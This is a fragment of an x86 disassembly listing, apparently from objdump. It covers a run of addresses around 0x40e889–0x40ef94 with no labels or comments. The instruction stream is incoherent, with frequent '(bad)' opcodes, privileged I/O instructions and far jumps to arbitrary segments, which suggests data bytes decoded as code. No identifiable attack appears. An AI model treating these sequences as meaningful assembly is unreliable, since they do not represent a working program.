  40e889:	adc    BYTE PTR [ebx+0x8369735],bl
  40e88f:	lahf   
  40e890:	cwde   
  40e891:	mov    BYTE PTR [edx],al
  40e893:	ffreep st(2)
  40e895:	imul   edi,DWORD PTR [ebx],0xffffffe1
  40e898:	mov    bh,0xaf
  40e89a:	int3   
  40e89b:	dec    edx
  40e89c:	das    
  40e89d:	inc    ebp
  40e89e:	jle    0x40e855
  40e8a0:	js     0x40e884
  40e8a2:	xor    al,0xff
  40e8a4:	hlt    
  40e8a5:	ins    BYTE PTR es:[edi],dx
  40e8a6:	bound  ebp,QWORD PTR [eax+eax*8]
  40e8a9:	cmp    edx,DWORD PTR [esi+edx*2-0x36]
  40e8ad:	dec    esi
  40e8ae:	jne    0x40e8c5
  40e8b0:	sbb    edi,DWORD PTR [ebp+0x32]
  40e8b3:	sbb    BYTE PTR [edx+0x200d158a],ch
  40e8b9:	add    ebx,DWORD PTR [eax]
  40e8bb:	test   BYTE PTR [edx-0x197ee97c],0xd7
  40e8c2:	cmp    bl,BYTE PTR [eax]
  40e8c4:	repnz shr DWORD PTR [edi],0x24
  40e8c8:	cs imul edx,ebx,0x0
  40e8cc:	sbb    al,0xb3
  40e8ce:	sub    BYTE PTR [edi-0x6a758184],dl
  40e8d4:	push   eax
  40e8d5:	pop    ss
  40e8d6:	sub    eax,0x387e8885
  40e8db:	(bad)  
  40e8dc:	and    ch,bl
  40e8de:	enter  0x68c9,0x1c
  40e8e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8e4:	int    0x50
  40e8e6:	scas   eax,DWORD PTR es:[edi]
  40e8e7:	add    dl,BYTE PTR [ebx-0x40]
  40e8ea:	dec    edi
  40e8eb:	add    edx,ecx
  40e8ed:	out    0x73,eax
  40e8ef:	cli    
  40e8f0:	cmp    edx,DWORD PTR [edi]
  40e8f2:	jp     0x40e947
  40e8f4:	sbb    eax,ecx
  40e8f6:	cli    
  40e8f7:	adc    esp,esi
  40e8f9:	aaa    
  40e8fa:	js     0x40e924
  40e8fc:	sub    bl,0x89
  40e8ff:	add    BYTE PTR [eax],bl
  40e901:	mov    ah,0x90
  40e903:	and    eax,0xa1c42836
  40e908:	gs mov bl,0x12
  40e90b:	mov    ds:0xe29d3909,eax
  40e910:	pop    ecx
  40e911:	xor    BYTE PTR [esi],0x7b
  40e914:	push   ebx
  40e915:	pop    edi
  40e916:	or     eax,0x539fe69f
  40e91b:	mov    eax,DWORD PTR [edx+0x7b36a7a0]
  40e921:	lods   eax,DWORD PTR ds:[esi]
  40e922:	test   eax,0xca90432f
  40e927:	push   0x906468c5
  40e92c:	ds inc esi
  40e92e:	in     al,0x4e
  40e930:	jl     0x40e94d
  40e932:	loopne 0x40e993
  40e934:	cwde   
  40e935:	adc    BYTE PTR [ecx],al
  40e937:	and    esi,ebx
  40e939:	mov    ecx,0x588133b1
  40e93e:	(bad)  
  40e93f:	xlat   BYTE PTR ds:[ebx]
  40e940:	add    BYTE PTR [ecx],ah
  40e942:	jbe    0x40e967
  40e944:	mov    edi,0x56d70d51
  40e949:	cli    
  40e94a:	inc    ebp
  40e94b:	push   esi
  40e94c:	(bad)  
  40e94d:	sar    DWORD PTR [ebx+0x5459c4],1
  40e953:	ins    BYTE PTR es:[edi],dx
  40e954:	or     eax,0xeb1d33df
  40e959:	loopne 0x40e9a2
  40e95b:	push   DWORD PTR [ebp+0x74]
  40e95e:	mov    ecx,0xd75e4a9a
  40e963:	fs inc esp
  40e965:	mov    edi,0x64f98c45
  40e96a:	sub    edx,ebp
  40e96c:	or     ebx,DWORD PTR [esi-0x6fabfdd2]
  40e972:	adc    BYTE PTR ds:0xf31f2a6b,ah
  40e978:	pop    edx
  40e979:	int    0xdf
  40e97b:	xor    al,0x31
  40e97d:	loope  0x40e915
  40e97f:	jmp    0x40e995
  40e981:	inc    ebx
  40e982:	outs   dx,BYTE PTR ds:[esi]
  40e983:	in     eax,0x64
  40e985:	push   esp
  40e986:	or     al,0xda
  40e988:	loop   0x40e9b5
  40e98a:	or     al,0xbb
  40e98c:	rcr    esi,0xc0
  40e98f:	xchg   ebp,eax
  40e990:	jl     0x40e948
  40e992:	fdivr  DWORD PTR [ebx+0x21d30cc1]
  40e998:	aaa    
  40e999:	or     BYTE PTR [ebx],al
  40e99b:	into   
  40e99c:	clc    
  40e99d:	gs cdq 
  40e99f:	pop    esp
  40e9a0:	clc    
  40e9a1:	shl    BYTE PTR [edi],0x9f
  40e9a4:	sub    ebp,DWORD PTR [ebx+0x10]
  40e9a7:	xor    esi,DWORD PTR [edi-0x2e]
  40e9aa:	sbb    al,0x28
  40e9ac:	pop    ds
  40e9ad:	in     eax,dx
  40e9ae:	pop    esp
  40e9af:	(bad)  
  40e9b0:	(bad)  
  40e9b1:	jo     0x40e9a4
  40e9b3:	mov    al,0x6e
  40e9b5:	sti    
  40e9b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9b7:	dec    esp
  40e9b8:	inc    ebp
  40e9b9:	xchg   esp,eax
  40e9ba:	sti    
  40e9bb:	push   edx
  40e9bc:	cmc    
  40e9bd:	inc    esp
  40e9be:	lods   al,BYTE PTR ds:[esi]
  40e9bf:	shr    DWORD PTR [edx],0xb2
  40e9c2:	cli    
  40e9c3:	mov    BYTE PTR [ecx],bh
  40e9c5:	arpl   WORD PTR [ecx-0x2c],ax
  40e9c8:	dec    edi
  40e9c9:	jbe    0x40e98b
  40e9cb:	and    dh,BYTE PTR [eax-0x41]
  40e9ce:	jno    0x40e956
  40e9d0:	pop    esi
  40e9d1:	adc    edi,DWORD PTR [esi+0x6ae0a8a6]
  40e9d7:	mov    edi,0x632e2fac
  40e9dc:	retf   
  40e9dd:	clc    
  40e9de:	cwde   
  40e9df:	cmp    DWORD PTR [eax],ecx
  40e9e1:	cmp    DWORD PTR [edi+0x7713c1ec],ebp
  40e9e7:	out    0x8b,al
  40e9e9:	jp     0x40e970
  40e9eb:	xchg   ecx,eax
  40e9ec:	fstp   TBYTE PTR [edx-0x65]
  40e9ef:	mov    esi,0xd529a73c
  40e9f4:	jbe    0x40e9a2
  40e9f6:	je     0x40e9df
  40e9f8:	sbb    al,0x2f
  40e9fa:	sub    bl,BYTE PTR [eax+0x524a30ad]
  40ea00:	and    BYTE PTR [esp+eiz*4-0x3b6cf718],0xed
  40ea08:	xchg   edx,eax
  40ea09:	cs and al,0x70
  40ea0c:	push   edx
  40ea0d:	ins    DWORD PTR es:[edi],dx
  40ea0e:	inc    esp
  40ea0f:	and    ebp,DWORD PTR [esi+0x16]
  40ea12:	jne    0x40ea28
  40ea14:	popa   
  40ea15:	push   edx
  40ea16:	in     al,dx
  40ea17:	jmp    0x40ea28
  40ea19:	mov    dh,0x11
  40ea1b:	sub    BYTE PTR [ebx+0x4df75fe6],al
  40ea21:	call   0x4281:0xca4f7b76
  40ea28:	and    BYTE PTR [ebx+0x5e],cl
  40ea2b:	push   eax
  40ea2c:	ins    BYTE PTR es:[edi],dx
  40ea2d:	sbb    ebp,DWORD PTR [eax+0x544cf2c2]
  40ea33:	inc    ebx
  40ea34:	enter  0x2ae9,0x15
  40ea38:	or     DWORD PTR [edx-0x27],edi
  40ea3b:	rcr    DWORD PTR [eax+edx*4],cl
  40ea3e:	ins    BYTE PTR es:[edi],dx
  40ea3f:	inc    esp
  40ea40:	std    
  40ea41:	imul   DWORD PTR [edx]
  40ea43:	push   es
  40ea44:	daa    
  40ea45:	or     edx,DWORD PTR [eax]
  40ea47:	test   BYTE PTR [ebx-0x45],cl
  40ea4a:	inc    edx
  40ea4b:	fstp   DWORD PTR [edi+0x1c]
  40ea4e:	in     al,0x45
  40ea50:	test   eax,0xfaeb19cd
  40ea55:	add    ah,BYTE PTR [ecx+0xbe549f]
  40ea5b:	fnsave [ebx+0x3a]
  40ea5e:	out    dx,eax
  40ea5f:	jmp    0x7a35:0xe417791
  40ea66:	shr    BYTE PTR [esi-0x44],cl
  40ea69:	scas   al,BYTE PTR es:[edi]
  40ea6a:	push   esp
  40ea6b:	imul   esp,eax,0xf7244ae5
  40ea71:	hlt    
  40ea72:	adc    esi,DWORD PTR [bx+si]
  40ea75:	and    al,0xb9
  40ea77:	inc    ecx
  40ea78:	ret    0xa377
  40ea7b:	(bad)  
  40ea7c:	sub    DWORD PTR ds:0xf9f8842,ebp
  40ea82:	clc    
  40ea83:	sbb    dh,BYTE PTR [edx]
  40ea85:	push   ss
  40ea86:	and    edi,DWORD PTR [edi]
  40ea88:	ret    
  40ea89:	adc    eax,0x8f76b72
  40ea8e:	xor    DWORD PTR [ecx],esp
  40ea90:	aam    0x7f
  40ea92:	idiv   DWORD PTR [edi+0x211c2884]
  40ea98:	or     al,0xb9
  40ea9a:	jecxz  0x40ea66
  40ea9c:	clc    
  40ea9d:	cmp    al,0x22
  40ea9f:	inc    ebp
  40eaa0:	mov    dh,0xff
  40eaa2:	sbb    al,0xf4
  40eaa4:	in     eax,dx
  40eaa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eaa6:	sub    ebp,DWORD PTR [edx]
  40eaa8:	mov    esp,DWORD PTR [ecx]
  40eaaa:	ss push ebp
  40eaac:	(bad)  
  40eaad:	and    DWORD PTR [ebx+0x25b39fed],esp
  40eab3:	pop    esi
  40eab4:	jo     0x40eadc
  40eab6:	cdq    
  40eab7:	jg     0x40eb02
  40eab9:	sub    bl,BYTE PTR [ecx-0x78887ff8]
  40eabf:	and    al,0x9e
  40eac1:	add    DWORD PTR [ecx+0x58b0f36f],0xec33bf04
  40eacb:	std    
  40eacc:	inc    ebx
  40eacd:	jle    0x40eb24
  40eacf:	cmp    esp,DWORD PTR [edx-0x2]
  40ead2:	jnp    0x40eb2e
  40ead4:	cwde   
  40ead5:	pop    ebp
  40ead6:	call   0x8ae2fa90
  40eadb:	aam    0xdf
  40eadd:	nop
  40eade:	imul   edx,ecx,0xefc6b04a
  40eae4:	scas   al,BYTE PTR es:[edi]
  40eae5:	mov    es,WORD PTR [ebp-0x226b8ecb]
  40eaeb:	pushf  
  40eaec:	add    ebx,DWORD PTR [ebx+0x6b9e0fd0]
  40eaf2:	cmp    eax,0x65cce258
  40eaf7:	repz sbb DWORD PTR [ebp-0x2e984fc0],esp
  40eafe:	fcomi  st,st(2)
  40eb00:	sub    al,0xb4
  40eb02:	xlat   BYTE PTR ds:[ebx]
  40eb03:	gs stos BYTE PTR es:[edi],al
  40eb05:	mov    ebp,0x7fe3b95b
  40eb0a:	nop
  40eb0b:	js     0x40eab1
  40eb0d:	xchg   edi,eax
  40eb0e:	dec    ebp
  40eb0f:	sub    BYTE PTR [eax+0x7002b55d],dh
  40eb15:	imul   eax,DWORD PTR [edi+0x4c7404d9],0x1c
  40eb1c:	pop    ss
  40eb1d:	outs   dx,DWORD PTR ds:[esi]
  40eb1e:	dec    ebx
  40eb1f:	test   al,0xca
  40eb21:	cmp    al,0x36
  40eb23:	jecxz  0x40ead6
  40eb25:	add    eax,0xe3d75ea2
  40eb2a:	mov    ebp,0x9ac5eba3
  40eb2f:	inc    ebx
  40eb30:	push   eax
  40eb31:	push   cs
  40eb32:	pop    ebp
  40eb33:	cmp    ebx,edx
  40eb35:	(bad)
  40eb38:	stos   DWORD PTR es:[edi],eax
  40eb39:	pop    ebp
  40eb3a:	xor    eax,DWORD PTR [edi+edx*4-0xc]
  40eb3e:	cmp    dl,dl
  40eb40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb41:	sub    BYTE PTR [eax+0x1b7ec071],ah
  40eb47:	je     0x40eb1b
  40eb49:	and    ch,cl
  40eb4b:	pop    esi
  40eb4c:	pusha  
  40eb4d:	push   eax
  40eb4e:	pushf  
  40eb4f:	mov    ah,0x3f
  40eb51:	or     edx,edi
  40eb53:	inc    eax
  40eb54:	adc    BYTE PTR [ebx+0x6b],ah
  40eb57:	mov    eax,0xadeb9241
  40eb5c:	out    dx,al
  40eb5d:	pop    edx
  40eb5e:	mov    bl,0xf9
  40eb60:	mov    ecx,0x395f693a
  40eb65:	mov    dl,BYTE PTR [ecx-0x10]
  40eb68:	cmp    dh,dh
  40eb6a:	push   cs
  40eb6b:	mov    ecx,0x8053cc7b
  40eb70:	xor    eax,0x6c8361b5
  40eb75:	or     DWORD PTR [esi+0x49],esp
  40eb78:	ds pop edi
  40eb7a:	loope  0x40eafd
  40eb7c:	pop    ebx
  40eb7d:	jle    0x40ebd3
  40eb7f:	adc    ebp,DWORD PTR ds:0x2f7f2b2a
  40eb85:	add    BYTE PTR [ebp+0x68],al
  40eb88:	pusha  
  40eb89:	out    dx,eax
  40eb8a:	test   al,0xa7
  40eb8c:	ins    DWORD PTR es:[edi],dx
  40eb8d:	push   eax
  40eb8e:	loopne 0x40eb28
  40eb90:	mov    ebx,0xf5612be0
  40eb95:	pop    ecx
  40eb96:	nop
  40eb97:	cli    
  40eb98:	dec    ebp
  40eb99:	dec    esp
  40eb9a:	xchg   edx,eax
  40eb9b:	imul   ebp,DWORD PTR [ecx],0x11
  40eb9e:	shl    DWORD PTR [esi],0xcb
  40eba1:	mov    al,0xce
  40eba3:	xchg   ebp,eax
  40eba4:	clc    
  40eba5:	call   0x5bfe0a52
  40ebaa:	mov    cl,0x35
  40ebac:	pushf  
  40ebad:	pusha  
  40ebae:	std    
  40ebaf:	adc    eax,DWORD PTR [ebx-0x4f]
  40ebb2:	sub    eax,0x97579df9
  40ebb7:	or     DWORD PTR [eax],0x13
  40ebba:	or     DWORD PTR [edi-0x63a569bc],ecx
  40ebc0:	mov    bl,0x59
  40ebc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebc3:	push   edx
  40ebc4:	addr16 pop ebx
  40ebc6:	mov    dl,BYTE PTR [edx]
  40ebc8:	stos   BYTE PTR es:[edi],al
  40ebc9:	les    esp,FWORD PTR [eax-0x62]
  40ebcc:	pop    ds
  40ebcd:	mov    cl,0xe5
  40ebcf:	add    bl,0xb4
  40ebd2:	popf   
  40ebd3:	sub    DWORD PTR [esi+ebx*1-0x52],ebx
  40ebd7:	aas    
  40ebd8:	div    ah
  40ebda:	mov    ecx,0xd05c023f
  40ebdf:	rcr    DWORD PTR [esi+0x34849bc7],cl
  40ebe5:	sti    
  40ebe6:	inc    ebp
  40ebe7:	lods   eax,DWORD PTR ds:[esi]
  40ebe8:	jbe    0x40ebb0
  40ebea:	jb     0x40ebb3
  40ebec:	test   BYTE PTR [ebp-0x362d7e0f],bl
  40ebf2:	rcr    BYTE PTR gs:[edx],0xb9
  40ebf6:	and    BYTE PTR [ebp+0x2d],dh
  40ebf9:	aam    0xf0
  40ebfb:	call   0xaf14:0x40e312d2
  40ec02:	stos   DWORD PTR es:[edi],eax
  40ec03:	cmp    BYTE PTR [ebp-0x5e],bl
  40ec06:	ja     0x40ec35
  40ec08:	scas   al,BYTE PTR es:[edi]
  40ec09:	ja     0x40ebc1
  40ec0b:	sub    eax,0x554672d5
  40ec10:	imul   esp,esi,0x47831bc9
  40ec16:	data16 mov dl,0xff
  40ec19:	ss aam 0xdf
  40ec1c:	cmp    ebp,DWORD PTR [edx-0x68d38aee]
  40ec22:	mov    ch,BYTE PTR [esi+0x7f]
  40ec25:	in     eax,dx
  40ec26:	pop    edi
  40ec27:	mov    esp,0xf83229e1
  40ec2c:	mov    ds:0x12a74c7c,al
  40ec31:	xor    DWORD PTR [edx-0x3dd8ebf],0xddbbdab2
  40ec3b:	stos   DWORD PTR es:[edi],eax
  40ec3c:	adc    DWORD PTR [eax-0x54],esi
  40ec3f:	jg     0x40ebfe
  40ec41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec42:	hlt    
  40ec43:	and    BYTE PTR [edi],dh
  40ec45:	inc    eax
  40ec46:	in     eax,dx
  40ec47:	std    
  40ec48:	mov    esi,cs
  40ec4a:	nop
  40ec4b:	cdq    
  40ec4c:	jle    0x40ebde
  40ec4e:	add    al,0x84
  40ec50:	and    BYTE PTR [esi],cl
  40ec52:	mov    eax,ds:0xcf74342
  40ec57:	in     al,dx
  40ec58:	push   0x3eb3eeb8
  40ec5d:	push   ecx
  40ec5e:	movlps QWORD PTR [edi],xmm5
  40ec61:	out    0xfb,al
  40ec63:	push   ss
  40ec64:	stos   DWORD PTR es:[edi],eax
  40ec65:	pop    eax
  40ec66:	stc    
  40ec67:	push   ss
  40ec68:	popf   
  40ec69:	sbb    DWORD PTR [edi],ecx
  40ec6b:	and    eax,0xc039acee
  40ec70:	loop   0x40ecea
  40ec72:	and    cl,ah
  40ec74:	addr16 call 0xea2872e4
  40ec7a:	fdivr  QWORD PTR [eax+0x6a]
  40ec7d:	xchg   ebp,eax
  40ec7e:	cli    
  40ec7f:	pushf  
  40ec80:	stos   DWORD PTR es:[edi],eax
  40ec81:	inc    esi
  40ec82:	and    DWORD PTR [ecx],esp
  40ec84:	dec    ebp
  40ec85:	and    eax,0x732a3078
  40ec8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec8b:	aad    0xff
  40ec8d:	in     eax,0x48
  40ec8f:	dec    eax
  40ec90:	rep lods eax,DWORD PTR ds:[si]
  40ec93:	push   ds
  40ec94:	aad    0x54
  40ec96:	and    al,0xea
  40ec98:	mov    esi,fs
  40ec9a:	pop    ebx
  40ec9b:	mov    ecx,0xc5212865
  40eca0:	hlt    
  40eca1:	lods   eax,DWORD PTR es:[esi]
  40eca3:	nop
  40eca4:	push   edi
  40eca5:	xchg   DWORD PTR [ecx],ebx
  40eca7:	sub    eax,0x442202a1
  40ecac:	mov    eax,0xa586e3de
  40ecb1:	push   0xffffffec
  40ecb3:	push   0x1472fa89
  40ecb8:	test   BYTE PTR [esi],bl
  40ecba:	pop    ds
  40ecbb:	sub    eax,0x98477728
  40ecc0:	stc    
  40ecc1:	ins    DWORD PTR es:[edi],dx
  40ecc2:	xor    al,BYTE PTR [edx]
  40ecc4:	retf   0xe6ff
  40ecc7:	sbb    al,0x82
  40ecc9:	mov    ds,WORD PTR [eax+eax*1-0x1a]
  40eccd:	dec    ebp
  40ecce:	(bad)  
  40eccf:	xlat   BYTE PTR ds:[ebx]
  40ecd0:	dec    edi
  40ecd1:	and    edi,DWORD PTR [ecx-0x43]
  40ecd4:	sub    cl,dl
  40ecd6:	xchg   edi,eax
  40ecd7:	pop    ss
  40ecd8:	jmp    0x94d7:0x8b9147fe
  40ecdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ece0:	add    bl,BYTE PTR [ebx]
  40ece2:	loopne 0x40ecd7
  40ece4:	inc    esi
  40ece5:	outs   dx,BYTE PTR ds:[esi]
  40ece6:	jno    0x40ed3e
  40ece8:	mov    eax,ds:0x91d76f4e
  40eced:	sahf   
  40ecee:	int    0x36
  40ecf0:	and    BYTE PTR [ebx],bh
  40ecf2:	or     ah,al
  40ecf4:	mov    bl,0xcf
  40ecf6:	xor    dh,dh
  40ecf8:	xor    al,0x55
  40ecfa:	ja     0x40ed4e
  40ecfc:	stc    
  40ecfd:	push   ebp
  40ecfe:	dec    ebp
  40ecff:	jmp    0x70be448b
  40ed04:	jne    0x40ecba
  40ed06:	adc    bh,0x9d
  40ed09:	inc    eax
  40ed0a:	out    0x1b,al
  40ed0c:	stc    
  40ed0d:	fnsave [ebp-0x202ee253]
  40ed13:	aas    
  40ed14:	dec    eax
  40ed15:	pop    edi
  40ed16:	call   0xa610299d
  40ed1b:	(bad)  
  40ed1c:	cmc    
  40ed1d:	jnp    0x40ed2b
  40ed1f:	and    DWORD PTR [ebx+0x3],ecx
  40ed22:	jp     0x40eced
  40ed24:	and    BYTE PTR [ecx-0x47],dh
  40ed27:	fidiv  WORD PTR [eax-0x41a86ef4]
  40ed2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed2e:	pusha  
  40ed2f:	xchg   ebp,eax
  40ed30:	adc    DWORD PTR [edx-0x28d3e25],eax
  40ed36:	test   DWORD PTR cs:[ecx+ebp*1+0x73],esi
  40ed3b:	mov    cl,0xb5
  40ed3d:	push   esp
  40ed3e:	fnstenv [edx]
  40ed40:	repnz test DWORD PTR [edi],esi
  40ed43:	xlat   BYTE PTR ds:[ebx]
  40ed44:	inc    edi
  40ed45:	xchg   ebp,eax
  40ed46:	ds loope 0x40ed5c
  40ed49:	mov    esp,0x763a573c
  40ed4e:	(bad)  
  40ed50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed51:	pop    DWORD PTR [esi+0x7e41fdcf]
  40ed57:	jl     0x40ed3f
  40ed59:	or     ah,al
  40ed5b:	ja     0x40eddb
  40ed5d:	jo     0x40ed49
  40ed5f:	dec    eax
  40ed60:	leave  
  40ed61:	dec    ecx
  40ed62:	ins    BYTE PTR es:[edi],dx
  40ed63:	stc    
  40ed64:	mov    ebp,0x6ea3c08b
  40ed69:	sub    DWORD PTR [ecx],0xc39450a0
  40ed6f:	sub    ecx,DWORD PTR [ecx+0x44748963]
  40ed75:	xchg   esp,eax
  40ed76:	pop    esp
  40ed77:	loope  0x40edcb
  40ed79:	fild   WORD PTR [edx+ebx*1-0x66]
  40ed7d:	addr16 jmp 0x2b76e638
  40ed83:	xchg   ebp,eax
  40ed84:	out    0x6d,eax
  40ed86:	int3   
  40ed87:	loopne 0x40ed66
  40ed89:	jmp    0x9e74:0x129a75e
  40ed90:	push   ebp
  40ed91:	stos   BYTE PTR es:[edi],al
  40ed92:	nop
  40ed93:	out    dx,al
  40ed94:	pop    esp
  40ed95:	ds inc ebp
  40ed97:	repz mov ds,WORD PTR [ebx-0x21b680ba]
  40ed9e:	and    BYTE PTR [eax+0x4f1f275a],dh
  40eda4:	jae    0x40edb7
  40eda6:	xchg   DWORD PTR [ecx-0x27],esi
  40eda9:	loope  0x40eddb
  40edab:	loope  0x40ed5c
  40edad:	idiv   BYTE PTR [eax+0x61]
  40edb0:	call   0xd7ef:0x978d5990
  40edb7:	scas   eax,DWORD PTR es:[edi]
  40edb8:	into   
  40edb9:	nop
  40edba:	ins    DWORD PTR es:[edi],dx
  40edbb:	push   cs
  40edbc:	pop    edx
  40edbd:	cli    
  40edbe:	fld    TBYTE PTR [ecx+0x2bd79df6]
  40edc4:	ret    0xfc49
  40edc7:	and    ecx,DWORD PTR [eax+edi*2-0x55]
  40edcb:	jo     0x40ee07
  40edcd:	ret    0xf024
  40edd0:	adc    DWORD PTR [edi+ebp*2+0x766c1445],edx
  40edd7:	cs ret 0x7d69
  40eddb:	mov    db1,ebp
  40edde:	ror    DWORD PTR [ebx-0x57],0xc8
  40ede2:	xlat   BYTE PTR ds:[ebx]
  40ede3:	jmp    0x19f4:0x750508b7
  40edea:	mov    ds:0xa343919f,eax
  40edef:	adc    edi,DWORD PTR [edi]
  40edf1:	push   0xc63ec64b
  40edf6:	div    BYTE PTR [ebp+0xe23a4df]
  40edfc:	xlat   BYTE PTR ds:[ebx]
  40edfd:	pushf  
  40edfe:	clc    
  40edff:	jnp    0x40ee25
  40ee01:	inc    DWORD PTR [esi-0x4877a58f]
  40ee07:	adc    BYTE PTR [ebx],bl
  40ee09:	mov    ebx,0xdd9a4276
  40ee0e:	xchg   edx,eax
  40ee0f:	dec    esi
  40ee10:	rcl    DWORD PTR [esi-0x7b],0xd3
  40ee14:	shr    DWORD PTR [ecx-0x3dd30350],1
  40ee1a:	xchg   DWORD PTR [ebx],ebp
  40ee1c:	fisub  WORD PTR [edi-0x37]
  40ee1f:	mov    dh,0x7b
  40ee21:	retf   0x91b2
  40ee24:	test   BYTE PTR [edx-0xbabec9d],bh
  40ee2a:	rcpps  xmm0,XMMWORD PTR [esi-0x2d99a3c3]
  40ee31:	cmp    DWORD PTR [edi+0x49],edi
  40ee34:	inc    ecx
  40ee35:	mov    fs,WORD PTR [eax]
  40ee37:	push   edi
  40ee38:	xor    dh,BYTE PTR [eax+0x7ed4db77]
  40ee3e:	and    eax,0x5b9f0cad
  40ee43:	inc    ebp
  40ee44:	leave  
  40ee45:	mov    dh,0xfa
  40ee47:	add    bl,dh
  40ee49:	xor    BYTE PTR [ecx+eiz*4],dl
  40ee4c:	rol    BYTE PTR [ebx+0x15],0x5d
  40ee50:	(bad)  
  40ee52:	or     BYTE PTR [ecx-0x6c],al
  40ee55:	es or  dh,bl
  40ee58:	sahf   
  40ee59:	enter  0x2b0,0x12
  40ee5d:	push   sp
  40ee5f:	loopne 0x40ee89
  40ee61:	(bad)  
  40ee62:	hlt    
  40ee63:	not    ecx
  40ee65:	push   ss
  40ee66:	cs jg  0x40ee43
  40ee69:	mov    dl,BYTE PTR [eax-0x56]
  40ee6c:	dec    esp
  40ee6d:	repz sbb eax,0x72c82b7c
  40ee73:	lods   al,BYTE PTR ds:[esi]
  40ee74:	push   0x8
  40ee76:	push   ds
  40ee77:	pop    es
  40ee78:	int3   
  40ee79:	jne    0x40ee04
  40ee7b:	mov    bh,0x4a
  40ee7d:	sahf   
  40ee7e:	pop    ecx
  40ee7f:	mov    dl,0x8f
  40ee81:	(bad)  
  40ee82:	jnp    0x40eebb
  40ee84:	adc    al,0xc9
  40ee86:	pop    ss
  40ee87:	or     eax,0xc5f209e4
  40ee8c:	fnstcw WORD PTR [esi-0x7eeaaaf5]
  40ee92:	xchg   esp,eax
  40ee93:	out    dx,eax
  40ee94:	xor    edi,edi
  40ee96:	cmp    al,BYTE PTR [ecx-0x46]
  40ee99:	shl    BYTE PTR [eax],cl
  40ee9b:	loope  0x40ee7c
  40ee9d:	dec    esp
  40ee9e:	xor    ch,BYTE PTR [edx]
  40eea0:	clc    
  40eea1:	and    ebx,DWORD PTR [ebx]
  40eea3:	popf   
  40eea4:	mov    esi,DWORD PTR [eax]
  40eea6:	retf   0x4bb1
  40eea9:	out    dx,eax
  40eeaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeab:	fs inc ebx
  40eead:	iret   
  40eeae:	mov    dh,0xf6
  40eeb0:	xchg   ebx,eax
  40eeb1:	inc    ecx
  40eeb2:	imul   ebp,DWORD PTR [ebx+0x7],0xfd7ce2fd
  40eeb9:	mov    eax,0x310b2128
  40eebe:	aad    0x3a
  40eec0:	outs   dx,BYTE PTR ds:[esi]
  40eec1:	cs dec esi
  40eec3:	push   0xc68f25fa
  40eec8:	jno    0x40ef35
  40eeca:	adc    cl,BYTE PTR [ebx+0x5d0929e7]
  40eed0:	fsub   QWORD PTR [ebp+0xc]
  40eed3:	jle    0x40ee7d
  40eed5:	dec    ebx
  40eed6:	or     eax,0x86f82b5c
  40eedb:	jl     0x40ee76
  40eedd:	test   DWORD PTR [edi+0x8],esi
  40eee0:	fisttp WORD PTR [edx+0x12868e74]
  40eee6:	std    
  40eee7:	test   BYTE PTR ds:0xd6f97f98,bl
  40eeed:	jle    0x40eef1
  40eeef:	test   BYTE PTR ds:0xc47824e4,al
  40eef5:	addr16 push cs
  40eef7:	adc    al,cl
  40eef9:	mov    al,BYTE PTR [eax-0x2d1f44d3]
  40eeff:	ror    ebx,cl
  40ef01:	fidiv  WORD PTR [ebx]
  40ef03:	jl     0x40ef0f
  40ef05:	pop    edx
  40ef06:	cmp    eax,0x15f75c99
  40ef0b:	sbb    eax,DWORD PTR [eax-0x7c]
  40ef0e:	mov    eax,0xb5023d26
  40ef13:	adc    ebx,esp
  40ef15:	icebp  
  40ef16:	aas    
  40ef17:	push   0x31
  40ef19:	rcr    DWORD PTR [eax],1
  40ef1b:	inc    ebp
  40ef1c:	aam    0xea
  40ef1e:	in     eax,0x97
  40ef20:	mov    dh,0x77
  40ef22:	xchg   DWORD PTR [ecx+0x10],ebx
  40ef25:	jp     0x40eec9
  40ef27:	inc    edx
  40ef28:	jl     0x40ef7d
  40ef2a:	cwde   
  40ef2b:	jne    0x40ef6a
  40ef2d:	jp     0x40ef81
  40ef2f:	jg     0x40ef77
  40ef31:	or     eax,0xbb9cffb3
  40ef36:	iret   
  40ef37:	(bad)  
  40ef38:	loop   0x40eee9
  40ef3a:	pop    ebx
  40ef3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef3c:	lea    edi,[edi-0x3e]
  40ef3f:	add    al,0xdd
  40ef41:	push   esi
  40ef42:	cmp    cl,ch
  40ef44:	jae    0x40ef51
  40ef46:	jg     0x40eef1
  40ef48:	sbb    BYTE PTR [ecx+0x31b692bf],dl
  40ef4e:	and    bh,BYTE PTR [ebx-0x73]
  40ef51:	jns    0x40ef30
  40ef53:	(bad)  
  40ef55:	sbb    cl,bh
  40ef57:	ins    BYTE PTR es:[edi],dx
  40ef58:	into   
  40ef59:	arpl   WORD PTR [ecx+edi*8],cx
  40ef5c:	pop    ss
  40ef5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef5f:	xor    al,0x37
  40ef61:	es dec ebp
  40ef63:	xchg   esp,eax
  40ef64:	test   al,0x10
  40ef66:	jl     0x40efa4
  40ef68:	pop    ebx
  40ef69:	pop    ecx
  40ef6a:	lock add al,0xdc
  40ef6d:	data16 mov al,ds:0x88a36504
  40ef73:	cli    
  40ef74:	cli    
  40ef75:	jo     0x40efac
  40ef77:	fst    QWORD PTR [ecx-0x5b]
  40ef7a:	push   ebx
  40ef7b:	ss in  eax,dx
  40ef7d:	jecxz  0x40ef32
  40ef7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef80:	imul   ebp,ebp,0xfb12f150
  40ef86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef87:	hlt    
  40ef88:	xor    BYTE PTR [eax+edi*1],0xb2
  40ef8c:	std    
  40ef8d:	jmp    0x1300:0x285fa27a
  40ef94:	sub    BYTE PTR [esi+esi*8+0x677f5ca2],dl
